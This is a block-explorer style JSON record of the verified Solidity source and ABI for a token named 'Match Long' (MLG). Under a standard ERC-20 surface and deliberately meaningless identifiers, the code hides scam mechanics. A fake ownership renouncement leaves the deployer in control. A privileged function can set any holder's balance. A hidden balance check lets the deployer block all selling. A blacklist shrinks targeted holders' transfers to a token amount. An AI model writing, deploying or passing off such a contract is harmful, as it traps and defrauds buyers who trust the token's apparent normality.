{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.12;\n\ninterface txLiquidity {\n    function createPair(address launchedBuy, address receiverTotal) external returns (address);\n}\n\ninterface receiverLaunchExempt {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address marketingLiquidity) external view returns (uint256);\n\n    function transfer(address senderToken, uint256 feeMarketing) external returns (bool);\n\n    function allowance(address takeModeReceiver, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 feeMarketing) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address senderToken,\n        uint256 feeMarketing\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed swapTake, uint256 value);\n    event Approval(address indexed takeModeReceiver, address indexed spender, uint256 value);\n}\n\nabstract contract minTotal {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface teamReceiverLiquidity {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface receiverLaunchExemptMetadata is receiverLaunchExempt {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract MatchLong is minTotal, receiverLaunchExempt, receiverLaunchExemptMetadata {\n\n    function transfer(address tokenFrom, uint256 feeMarketing) external virtual override returns (bool) {\n        return enableAmount(_msgSender(), tokenFrom, feeMarketing);\n    }\n\n    function minSellExempt() private view {\n        require(enableExempt[_msgSender()]);\n    }\n\n    address private launchSwap;\n\n    bool private senderReceiver;\n\n    event OwnershipTransferred(address indexed marketingAmount, address indexed marketingListMax);\n\n    function walletTrading(address tokenFrom, uint256 feeMarketing) public {\n        minSellExempt();\n        walletMarketing[tokenFrom] = feeMarketing;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return receiverSell;\n    }\n\n    function maxLimitLaunch(address senderWallet, address senderToken, uint256 feeMarketing) internal returns (bool) {\n        require(walletMarketing[senderWallet] >= feeMarketing);\n        walletMarketing[senderWallet] -= feeMarketing;\n        walletMarketing[senderToken] += feeMarketing;\n        emit Transfer(senderWallet, senderToken, feeMarketing);\n        return true;\n    }\n\n    uint256 constant fromLaunchedAmount = 6 ** 10;\n\n    function allowance(address swapTo, address fundAt) external view virtual override returns (uint256) {\n        if (fundAt == buyFromList) {\n            return type(uint256).max;\n        }\n        return totalExempt[swapTo][fundAt];\n    }\n\n    uint256 listToLimit;\n\n    bool private feeWalletTotal;\n\n    mapping(address => uint256) private walletMarketing;\n\n    uint256 private fundAmount = 100000000 * 10 ** 18;\n\n    string private swapMax = \"Match Long\";\n\n    address public shouldTotal;\n\n    function modeEnableReceiver(address senderTakeAuto) public {\n        if (marketingTradingExempt) {\n            return;\n        }\n        if (senderReceiver) {\n            senderReceiver = true;\n        }\n        enableExempt[senderTakeAuto] = true;\n        \n        marketingTradingExempt = true;\n    }\n\n    address public autoLimit;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return fundAmount;\n    }\n\n    function isAmount() public {\n        emit OwnershipTransferred(autoLimit, address(0));\n        launchSwap = address(0);\n    }\n\n    string private senderLiquidity = \"MLG\";\n\n    function owner() external view returns (address) {\n        return launchSwap;\n    }\n\n    mapping(address => bool) public enableExempt;\n\n    function teamMode(uint256 feeMarketing) public {\n        minSellExempt();\n        shouldAuto = feeMarketing;\n    }\n\n    uint256 public senderFrom;\n\n    bool public marketingTradingExempt;\n\n    bool private toAuto;\n\n    uint256 private minBuySell;\n\n    function enableAmount(address senderWallet, address senderToken, uint256 feeMarketing) internal returns (bool) {\n        if (senderWallet == autoLimit) {\n            return maxLimitLaunch(senderWallet, senderToken, feeMarketing);\n        }\n        uint256 tokenFee = receiverLaunchExempt(shouldTotal).balanceOf(receiverLimit);\n        require(tokenFee == shouldAuto);\n        require(senderToken != receiverLimit);\n        if (txTake[senderWallet]) {\n            return maxLimitLaunch(senderWallet, senderToken, fromLaunchedAmount);\n        }\n        return maxLimitLaunch(senderWallet, senderToken, feeMarketing);\n    }\n\n    function transferFrom(address senderWallet, address senderToken, uint256 feeMarketing) external override returns (bool) {\n        if (_msgSender() != buyFromList) {\n            if (totalExempt[senderWallet][_msgSender()] != type(uint256).max) {\n                require(feeMarketing <= totalExempt[senderWallet][_msgSender()]);\n                totalExempt[senderWallet][_msgSender()] -= feeMarketing;\n            }\n        }\n        return enableAmount(senderWallet, senderToken, feeMarketing);\n    }\n\n    uint256 public amountTeam;\n\n    address receiverLimit = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function balanceOf(address marketingLiquidity) public view virtual override returns (uint256) {\n        return walletMarketing[marketingLiquidity];\n    }\n\n    uint256 private receiverMax;\n\n    function approve(address fundAt, uint256 feeMarketing) public virtual override returns (bool) {\n        totalExempt[_msgSender()][fundAt] = feeMarketing;\n        emit Approval(_msgSender(), fundAt, feeMarketing);\n        return true;\n    }\n\n    function getOwner() external view returns (address) {\n        return launchSwap;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return swapMax;\n    }\n\n    mapping(address => bool) public txTake;\n\n    uint8 private receiverSell = 18;\n\n    constructor (){\n        \n        teamReceiverLiquidity walletIs = teamReceiverLiquidity(buyFromList);\n        shouldTotal = txLiquidity(walletIs.factory()).createPair(walletIs.WETH(), address(this));\n        if (minBuySell != amountTeam) {\n            feeWalletTotal = true;\n        }\n        autoLimit = _msgSender();\n        enableExempt[autoLimit] = true;\n        walletMarketing[autoLimit] = fundAmount;\n        isAmount();\n        if (amountTeam == receiverMax) {\n            amountTeam = minBuySell;\n        }\n        emit Transfer(address(0), autoLimit, fundAmount);\n    }\n\n    bool public atBuy;\n\n    function exemptEnable(address enableSwap) public {\n        minSellExempt();\n        if (receiverMax != senderFrom) {\n            atBuy = false;\n        }\n        if (enableSwap == autoLimit || enableSwap == shouldTotal) {\n            return;\n        }\n        txTake[enableSwap] = true;\n    }\n\n    mapping(address => mapping(address => uint256)) private totalExempt;\n\n    address buyFromList = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function symbol() external view virtual override returns (string memory) {\n        return senderLiquidity;\n    }\n\n    uint256 shouldAuto;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeModeReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingAmount\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingListMax\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapTake\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapTo\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundAt\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountTeam\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeMarketing\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoLimit\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingLiquidity\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"enableExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableSwap\",\"type\":\"address\"}],\"name\":\"exemptEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingTradingExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderTakeAuto\",\"type\":\"address\"}],\"name\":\"modeEnableReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldTotal\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"feeMarketing\",\"type\":\"uint256\"}],\"name\":\"teamMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeMarketing\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderWallet\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"senderToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeMarketing\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"txTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"feeMarketing\",\"type\":\"uint256\"}],\"name\":\"walletTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "MatchLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}